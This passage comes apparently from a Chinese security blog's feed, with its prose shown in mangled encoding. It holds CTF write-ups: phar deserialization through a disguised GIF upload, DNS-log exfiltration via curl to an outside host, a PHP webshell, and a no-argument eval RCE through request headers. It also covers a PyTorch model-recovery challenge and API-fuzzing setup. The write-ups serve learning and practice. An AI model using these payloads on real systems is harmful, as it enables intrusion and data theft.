class="string">&quot;phar.phar&quot;</span>); <span class="comment">#ç”Ÿæˆ phar æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">#è®¾ç½® phar æ–‡ä»¶å¤´ï¼Œè¿™é‡Œç”¨ GIF89a åšæ–‡ä»¶å¤´æ¬ºéª—ï¼Œé˜²æ­¢æœ‰æ–‡ä»¶å¤´æ£€æŸ¥</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">#è®¾ç½®å†…å®¹ï¼Œè¿™é‡Œä¼šç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">#éšä¾¿å†™ç‚¹ txtï¼Œè®©ä»–é€šè¿‡æ£€æŸ¥</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>å†™å®Œåæ”¹åç¼€ä¸º.gifï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ é¡µé¢ä¸Šä¼ è¯¥ phar æ–‡ä»¶ï¼Œç»“æœä¸Šä¼ ä¸ä¸Šå»ï¼Œå‘ç°æ˜¯ä»–å¯¹å†…å®¹åšäº†æ£€æŸ¥ï¼Œæ£€æŸ¥äº† phar çš„æ–‡ä»¶å¤´ï¼š__HALT_COMPILER();</p><p>è¿™é‡Œéœ€è¦ç»•è¿‡æ£€æŸ¥ï¼Œä½¿ç”¨ linux çš„gzipå‹ç¼© phar æ–‡ä»¶æ¥ç»•è¿‡æ£€æŸ¥ï¼Œé™¤äº† gzip ä»¥å¤–ï¼Œå°†Pharå‹ç¼©æˆ<strong>tarã€bzip2</strong>åå‡èƒ½å¤Ÿè§¦å‘ååºåˆ—åŒ–ï¼Œå¤§è‡´åŸç†å°±æ˜¯åœ¨æ‰§è¡Œphar:&#x2F;&#x2F;æ–‡ä»¶æ—¶ï¼Œä¼šåˆ¤æ–­è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸æ˜¯æ ‡å‡†çš„ phar æ–‡ä»¶ï¼Œåœ¨åˆ¤æ–­è¿‡ç¨‹ä¸­å¯¹ zipï¼Œgzï¼Œbz è¿™ä¸‰ç§å‹ç¼©å½¢å¼çš„å¹»æ•°åšäº†å¤„ç†ï¼Œåˆ†åˆ«è°ƒç”¨äº†ä»–ä»¬å¯¹åº”çš„decompressè¿‡æ»¤å™¨åšè§£å‹ç¼©å¤„ç†ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œå°†ç”Ÿæˆçš„ phar æ–‡ä»¶æ‹–åˆ° kali ç”¨ gzip è¿›è¡Œå‹ç¼©ï¼Œç„¶åä¸Šä¼ ï¼Œæ”¹åç¼€ä¸Šä¼ ï¼Œæ–‡ä»¶åä¸ºï¼ša.gifï¼Œå‘ç°æˆåŠŸä¸Šä¼ ï¼Œç„¶åæ„é€  payloadï¼š<br>file&#x3D;phar:&#x2F;&#x2F;uploads&#x2F;æ”¹ååçš„æ–‡ä»¶ï¼Œå‘ç°ç©ºäº† 5 ç§’ï¼ŒæˆåŠŸrceã€‚</p><p>è¿™é‡Œå¦å¤–ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯æ— å›æ˜¾ RCEï¼Œæœ¬äººå½“æ—¶ä¸€ç›´å¼¹ä¸åŠ¨ shellï¼Œæ‰€ä»¥å°±å†™äº†ä¸€ä¸ª DNSLOG å¤–å¸¦ï¼Œå…·ä½“æŒ‡ä»¤ä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://9esedf.ceye.io/`cat $(find / -name flag*)`</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <a href="http://9esedf.ceye.io/">http://9esedf.ceye.io/</a> æ˜¯ dnslog ç½‘ç«™( <a href="http://ceye.io/">http://ceye.io</a> )åˆ†é…ç»™æˆ‘çš„åŸŸåã€‚è¿™é‡Œæ³¨æ„ dnslog å¤–å¸¦åªèƒ½å¸¦ä¸€ä¸ªå‚æ•°å‡ºæ¥ï¼Œæ‰€ä»¥å¦‚æœä½ ç”¨ ls åªèƒ½è·å¾—åˆ° ls çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚ä¹‹åç”¨ find æŒ‡ä»¤å»æ‰¾ flagï¼Œç„¶åå¸¦å‡ºæ¥ï¼Œè·å¾— flagï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2023/10/29/newstarctf2023-pharone/2.jpg"></p><h2 id="å®˜æ–¹é¢˜è§£"><a href="#å®˜æ–¹é¢˜è§£" class="headerlink" title="å®˜æ–¹é¢˜è§£"></a>å®˜æ–¹é¢˜è§£</h2><p>å®˜æ–¹é¢˜è§£ä¸Šè¯´ï¼š</p><p>â€œWebæ ¹ç›®å½•å¯å†™ï¼Œå¯ä»¥ç›´æ¥å†™ä¸€ä¸ªWebShellè¿›å»â€</p><p>æ„é€  cmd ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶å getshellï¼Œç¡®å®æ²¡æœ‰å¾€è¿™æ–¹é¢æƒ³ï¼Œæ˜¯æˆ‘æƒ³å¤æ‚äº†ï¼Œå­¦åˆ°äº† QAQ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phar </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> DNS log å¤–å¸¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç½‘ä¿¡ä¸­å±±ã€‘Pytorch ç¥ç»ç½‘ç»œå¤åŸ</title>
      <link href="/2023/10/29/%E7%BD%91%E4%BF%A1%E4%B8%AD%E5%B1%B1-AI-%E9%A2%98/"/>
      <url>/2023/10/29/%E7%BD%91%E4%BF%A1%E4%B8%AD%E5%B1%B1-AI-%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€ç½‘ä¿¡ä¸­å±±ã€‘Misc-Pytorch-ç¥ç»ç½‘ç»œå¤åŸ"><a href="#ã€ç½‘ä¿¡ä¸­å±±ã€‘Misc-Pytorch-ç¥ç»ç½‘ç»œå¤åŸ" class="headerlink" title="ã€ç½‘ä¿¡ä¸­å±±ã€‘Misc Pytorch ç¥ç»ç½‘ç»œå¤åŸ"></a>ã€ç½‘ä¿¡ä¸­å±±ã€‘Misc Pytorch ç¥ç»ç½‘ç»œå¤åŸ</h1><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>ä¸­å±±æ¯æ‰“åˆ°åæœŸï¼Œæ”¾å‡ºäº†ä¸€é“ misc é¢˜ï¼Œä¸‹è½½é™„ä»¶æ‹¿åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚è§£å‹è·å¾—äº†å¦‚ä¸‹æ–‡ä»¶ï¼š</p><ul><li>.npy æ–‡ä»¶ : ç”¨äºå­˜å‚¨ numpy æ•°ç»„</li><li>label.json æ–‡ä»¶ : ç”¨äºå­˜å‚¨æ¨¡å‹æ ‡ç­¾</li><li>MyLeNet.pt æ–‡ä»¶ :  PyTorch çš„åºåˆ—åŒ–æ–‡ä»¶æ ¼å¼ï¼Œç”¨äºä¿å­˜å’ŒåŠ è½½ PyTorch æ¨¡å‹çš„å‚æ•°å’ŒçŠ¶æ€ã€‚è¿™ç§æ ¼å¼æ–¹ä¾¿ç”¨æˆ·åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ä¿å­˜æ£€æŸ¥ç‚¹ï¼Œä»¥åŠåœ¨åç»­çš„æ¨ç†æˆ–ç»§ç»­è®­ç»ƒè¿‡ç¨‹ä¸­åŠ è½½æ¨¡å‹ã€‚</li></ul><h2 id="æ€è€ƒè¿‡ç¨‹"><a href="#æ€è€ƒè¿‡ç¨‹" class="headerlink" title="æ€è€ƒè¿‡ç¨‹"></a>æ€è€ƒè¿‡ç¨‹</h2><p>åœ¨è¿™é‡Œæ€è·¯å…¶å®å¾ˆæ˜æ˜¾ï¼š å…ˆæ ¹æ® pt æ–‡ä»¶å¤åŸæ¨¡å‹ï¼Œç„¶åå°† npy æ–‡ä»¶å…¨éƒ¨å–‚ç»™æ¨¡å‹ï¼Œå¾—åˆ°çš„è¾“å‡ºæ ¹æ® label.jsonæ–‡ä»¶åšæ ‡ç­¾åˆ†ç±»ï¼Œç„¶åå†æ‹¼æ¥è·å¾—flagã€‚</p><p>è¿™é‡Œæœ€éš¾çš„å°±æ˜¯æ¨¡å‹çš„å¤åŸï¼Œå®Œå…¨ä¸çŸ¥é“ä»–ä½¿ç”¨çš„å“ªä¸ªéçº¿æ€§æ–¹æ³•ï¼Œæˆ‘è¯•äº†å¾ˆä¹…ä¹Ÿæ²¡è¯•å‡ºæ¥ï¼Œè·‘å‡ºæ¥çš„ç»“æœå¯¹ç§°æ€§éå¸¸å¼ºï¼Œä¸€åº¦è®©æˆ‘ä»¥ä¸ºæ˜¯è¿˜è¦è§£ç ï¼Œæœ€åé—æ†¾å‘Šç»ˆï¼Œå¯¹è¿™ç±»é¢˜è¿˜æ˜¯å¤ªé™Œç”Ÿäº†ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ¯”èµ›ç»“æŸåçœ‹äº†å”¯ä¸€åšå‡ºæ¥çš„é‚£é˜Ÿçš„ WPï¼Œæ‰å‘ç°å±…ç„¶è¦é€†MyLeNet.ptæ–‡ä»¶ï¼Œç›´æ¥æŠŠ MyLeNet æ–‡ä»¶æ”¾åˆ° CyberChef é‡Œï¼Œçœ‹å†…å®¹ï¼Œå‘ç°é‡Œé¢æœ‰ sigmoid å’Œ relu éçº¿æ€§æ–¹æ³•ï¼Œç”±äºåªæœ‰ä¸¤ç§éçº¿æ€§æ–¹æ³•ï¼Œä¸€å…±å››ä¸ªå±‚ï¼Œåšä¸€ä¸ªæ’åˆ—ç»„åˆå°±èƒ½å¤Ÿæ‹¿åˆ° flag äº†ï¼Œ</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰æ¨¡å‹ç»“æ„ï¼Œä¸æä¾›çš„ MyLeNet.pt ç»“æ„åŒ¹é…</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyLeNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">1</span>, <span class="number">6</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">256</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># è¿™ä¸ªåœ°æ–¹è¦æ’åˆ—ç»„åˆå»å°è¯•</span></span><br><span class="line">        x = torch.sigmoid(self.conv1(x))</span><br><span class="line">        x = torch.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = torch.relu(self.conv2(x))</span><br><span class="line">        x = torch.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line">        x = torch.sigmoid(self.fc1(x))</span><br><span class="line">        x = torch.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æ¨¡å‹å‚æ•°</span></span><br><span class="line">model = MyLeNet()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;MyLeNet.pt&#x27;</span>, map_location=torch.device(<span class="string">&#x27;cpu&#x27;</span>)))</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ç”¨äºæ‹¼æ¥ç»“æœ</span></span><br><span class="line">predicted_string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æ ‡ç­¾æ˜ å°„</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;label.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    label_map = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½å¹¶é¢„æµ‹æ ·æœ¬</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">    sample = np.load(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.npy&quot;</span>)</span><br><span class="line">    sample = torch.tensor(sample, dtype=torch.float32).unsqueeze(<span class="number">0</span>).unsqueeze(<span class="number">0</span>)  <span class="comment"># æ·»åŠ  batch å’Œ channel ç»´åº¦</span></span><br><span class="line">    prediction = model(sample)</span><br><span class="line">    predicted_label = torch.argmax(prediction, dim=<span class="number">1</span>).item()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ ¹æ®æ ‡ç­¾æ˜ å°„æ‰¾åˆ°é¢„æµ‹çš„å­—ç¬¦</span></span><br><span class="line">    predicted_character = [char <span class="keyword">for</span> char, label <span class="keyword">in</span> label_map.items() <span class="keyword">if</span> label == predicted_label][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å°†é¢„æµ‹çš„å­—ç¬¦æ·»åŠ åˆ°å­—ç¬¦ä¸²ä¸­</span></span><br><span class="line">    predicted_string += predicted_character</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æ‹¼æ¥åçš„å®Œæ•´å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(predicted_string)</span><br></pre></td></tr></table></figure><p>ç„¶åè¯•çš„è¯å‘ç°å…¶ä¸­ sigmoid+relu+sigmoid+relu è¿™ä¸ªç»„åˆçš„ç»“æœä¸º:</p><pre><code>ZmxhZ3thNzkzZjI1Ny01Nzg4LWYwZjYtY2E5Zi00YTgyZWE3MmUwYzZ9</code></pre><p>çœ¼ç†Ÿçš„ base64ï¼Œæ‹¿å» base64 è§£ç å³å¯è·å¾— flagï¼š</p><p>flag{a793f257-5788-f0f6-ca9f-4a82ea72e0c6}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¥ç»ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€newstarctf2023ã€‘ æ— å‚æ•° rce</title>
      <link href="/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/"/>
      <url>/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€newstarctfã€‘-R-C-E-æ— å‚æ•°-RCE"><a href="#ã€newstarctfã€‘-R-C-E-æ— å‚æ•°-RCE" class="headerlink" title="ã€newstarctfã€‘ R!!C!!E!!  æ— å‚æ•° RCE"></a>ã€newstarctfã€‘ R!!C!!E!!  æ— å‚æ•° RCE</h1><p>æ‰“å¼€é¶æœºï¼Œæç¤ºæˆ‘ä»¬å†æ‰¾ä¿¡æ¯ï¼Œdirsearchä¸€ä¸‹å‘ç°æœ‰ git æ³„éœ²ï¼Œurlè¯·æ±‚è¯¥ path æ‹¿åˆ° git æ–‡ä»¶ï¼Œæ”¾åˆ° cyberchef é‡Œè§£å¯†çœ‹åˆ°æœ‰å…¶ä»–çš„ php æ–‡ä»¶ï¼Œæ‰“å¼€åçœ‹åˆ°æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æ˜¯ä¸€é“ RCE é¢˜ï¼Œè¿™è¾¹è¦ç»•æ­£åˆ™ï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„æ— å‚æ­£åˆ™ï¼Œä»–å¯ä»¥åŒ¹é…</p><ul><li>func();</li><li>func(func2());</li><li>func(func2(func3()));</li><li>func1(func2($_POST[a]));  è¿™ä¸ªè‡ªå·±å‘ç°çš„ï¼Œæ²¡å‡†ä»€ä¹ˆæ—¶å€™èƒ½ç”¨ä¸Š</li></ul><p>ç„¶åå°±å¯¼è‡´åé¢ pregï¼¿match ä¸èƒ½ç»•è¿‡ï¼Œåªèƒ½é€‰ pregï¼¿match è¿‡æ»¤ä»¥å¤–çš„æ— å‚æ•° RCEã€‚</p><p>æ³¨æ„åˆ°è¿™é‡Œæ²¡æœ‰é™åˆ¶getallheaders(),getallheaders()æ˜¯ä¸€ä¸ªæ— å‚è·å–æ‰€æœ‰è¯·æ±‚å¤´å†…å®¹çš„å‡½æ•°ï¼Œè¿”å›è¯·æ±‚å¤´æ•°ç»„ï¼Œç„¶å next ä¹Ÿæ²¡æœ‰ç¦ç”¨ï¼Œç»æ£€æŸ¥å‘ç°ä»–æ²¡æœ‰éªŒè¯è¯·æ±‚å¤´å®Œæ•´æ€§ï¼Œæˆ‘ä»¬å°±åˆ æ‰å…¶ä»–å‚æ•°åªå‰©ä¸‹ next èƒ½æ£€æµ‹åˆ°çš„å‚æ•°å°±èƒ½ä» header è·å– RCE å†…å®¹äº†ã€‚</p><p>æ•…æ„é€  payload ä¸ºï¼š</p><pre><code>?star=eval(next(getallheaders()));</code></pre><p>è¯·æ±‚å¤´é‡Œå°†Cache-Controlå­—æ®µçš„å€¼æ”¹ä¸ºï¼š</p><pre><code>system(&#39;cat /f*&#39;);</code></pre><p>å³å¯è·å– flag</p><p><img src="/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/result.jpg"></p><p>å®˜æ–¹é¢˜è§£æ„é€ çš„ payload æ˜¯ï¼š</p><pre><code>?star=eval(pos(array_reverse(getallheaders())));</code></pre><p>å¥¹ä»¬çš„æ€è·¯æ˜¯åè½¬ header æ•°ç»„å†å®šä½å½“å‰å…ƒç´ è·å–å‘½ä»¤ï¼Œå‘½ä»¤æ”¾åœ¨è¯·æ±‚å¤´æ•°ç»„æœ€åçš„å…ƒç´ ä¸Šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> æ— å‚æ•°ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>API FUZZINGæµç¨‹è¯´æ˜</title>
      <link href="/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/"/>
      <url>/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="REST-API-FUZZING-å®éªŒæµç¨‹"><a href="#REST-API-FUZZING-å®éªŒæµç¨‹" class="headerlink" title="REST API FUZZING å®éªŒæµç¨‹"></a>REST API FUZZING å®éªŒæµç¨‹</h1><p>æˆ‘çš„è®¾å¤‡ï¼š<br>windows11 + è°·æ­Œpixel + å®‰å“9<br>ç¯å¢ƒï¼š<br>adb + AppUIAutomator + mitmproxy</p><h2 id="adbè°ƒè¯•"><a href="#adbè°ƒè¯•" class="headerlink" title="adbè°ƒè¯•"></a>adbè°ƒè¯•</h2><p>å»ºè®®æœ‰çº¿è¿æ¥ï¼Œä¸ç”¨é¢‘ç¹çš„debugè€Œä¸”æ•°æ®ä¼ è¾“å¿«ï¼ŒUSBè¿æ¥ä¹‹åï¼š</p><pre><code>adb dedvices       #æŸ¥çœ‹å½“å‰è¿æ¥çš„adbè®¾å¤‡</code></pre><h2 id="mitmæŠ“åŒ…éƒ¨åˆ†"><a href="#mitmæŠ“åŒ…éƒ¨åˆ†" class="headerlink" title="mitmæŠ“åŒ…éƒ¨åˆ†"></a>mitmæŠ“åŒ…éƒ¨åˆ†</h2><ol><li>å¦‚æœä½¿ç”¨æ ¡å›­ç½‘æŠ“åŒ…ï¼Œè¦åœ¨ç”µè„‘æ‰“å¼€<strong>ç§»åŠ¨çƒ­ç‚¹</strong>ï¼Œç¡®ä¿æ‰‹æœºå’Œç”µè„‘åœ¨ä¸€ä¸ªç½‘æ®µå†…ï¼Œæ‰èƒ½æˆåŠŸæŠ“åŒ…ã€‚</li><li>è¿ä¸Šçƒ­ç‚¹åï¼Œç”µè„‘è¾“å…¥ipconfigï¼Œè·å–<strong>WLANçš„ipv4</strong>åœ°å€</li><li>æ‰“å¼€æ‰‹æœºï¼Œåœ¨wifié‚£é‡Œé…ç½®ä»£ç†ï¼Œipåœ°å€è¾“å…¥ä¸Šä¸€æ­¥æŠ“åˆ°çš„ï¼Œç«¯å£å·é»˜è®¤ä¸º8080ã€‚</li></ol><h2 id="adb-è·å–APKåŒ…å"><a href="#adb-è·å–APKåŒ…å" class="headerlink" title="adb è·å–APKåŒ…å"></a>adb è·å–APKåŒ…å</h2><p>å¯ä»¥ä½¿ç”¨adbæ¥ä¸ºæ‰‹æœºå®‰è£…APKï¼š</p><pre><code>adb install -d xxx.apk</code></pre><p>å®‰è£…å®Œæˆåï¼Œæ‰“å¼€è¯¥apkï¼Œç„¶åè¿è¡Œï¼š</p><pre><code>adb shell dumpsys window | findstr mCurrentFocus</code></pre><p>è·å–æ‰‹æœºå½“å‰æ­£åœ¨è¿è¡Œactivityçš„åŒ…åï¼ŒåŒ…åä¸ºä»å·¦åˆ°å³æ•°<strong>ç¬¬ä¸€ä¸ªcomå¼€å¤´çš„å­—æ®µ</strong>ï¼š<br><img src="/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/1.jpg"><br>ä¸Šå›¾ä¸­åŒ…åä¸º<strong>com.wuba</strong></p><h2 id="AppUIAutomator"><a href="#AppUIAutomator" class="headerlink" title="AppUIAutomator"></a>AppUIAutomator</h2><p>AppUIAutomatoråœ¨ä½¿ç”¨å‰ï¼Œè¦æŠŠæ‰€æœ‰è¦è¿è¡Œçš„appçš„<strong>åŒ…å</strong>æ”¾åœ¨æ ¹ç›®å½•çš„<strong>apk_pkgName.txt</strong>æ–‡ä»¶ä¸­ï¼Œæ ¼å¼ä¸º åŒ…å | APKåå­—ï¼Œå¦‚ï¼š</p><pre><code>com.wuba | 58åŒåŸ</code></pre><p>æ”¾å¥½ååœ¨å½“å‰æ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ï¼š</p><pre><code>Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass   #å¼€æ”¾æƒé™ï¼Œwindowså¿…åšpython test_integrate.py    #è¿è¡Œ</code></pre><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>åœ¨script.pyæ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œç›´æ¥è¿è¡Œï¼š</p><pre><code>mitmdump -s script_json.py</code></pre><p>å¦‚æœæ²¡æŠ“åˆ°åŒ…å¯èƒ½æœ‰ä»¥ä¸‹æƒ…å†µï¼š</p><ol><li>ä¸åœ¨ä¸€ä¸ªç½‘æ®µ</li><li>è¯ä¹¦æ²¡é…ç½®å¥½</li><li>ä»£ç†çš„ipåœ°å€æˆ–ç«¯å£å·ä¸å¯¹</li></ol><h2 id="å¯¹æ¯”è„šæœ¬éƒ¨åˆ†"><a href="#å¯¹æ¯”è„šæœ¬éƒ¨åˆ†" class="headerlink" title="å¯¹æ¯”è„šæœ¬éƒ¨åˆ†"></a>å¯¹æ¯”è„šæœ¬éƒ¨åˆ†</h2><p>ä¸ºäº†æ–¹ä¾¿ï¼Œç»Ÿä¸€å°†å¯¹æ¯”çš„ä¸¤ä¸ªæ–‡ä»¶å‘½åä¸º a.json å’Œ b.jsonï¼Œç„¶åç›´æ¥åœ¨compare.pyæ‰€åœ¨æ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œï¼š</p><pre><code>python compare.py</code></pre><p>å³å¯ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ol><li>cleaned_a.json ä»£è¡¨aç”¨æˆ·ç­›é€‰å‡ºçš„é”®å€¼å‘ç”Ÿå˜åŒ–çš„APIï¼Œé‡Œé¢åŒ…æ‹¬åŸŸå+å®Œæ•´path+é”®å+é”®å€¼</li><li>cleaned_b.json åŒä¸Šï¼Œä»£è¡¨bç”¨æˆ·</li><li>keywords.jsonï¼Œå…³é”®è¯çš„æ•´åˆï¼ŒåŒ…æ‹¬åŸŸå+éƒ¨åˆ†path+é”®å</li></ol>]]></content>
      
      
      <categories>
          
          <category> ç§‘ç ” </category>
          
          <category> API FUZZING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APIå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­çº§ SQL è¯­å¥</title>
      <link href="/2023/10/12/%E4%B8%AD%E7%BA%A7-SQL-%E8%AF%AD%E5%8F%A5/"/>
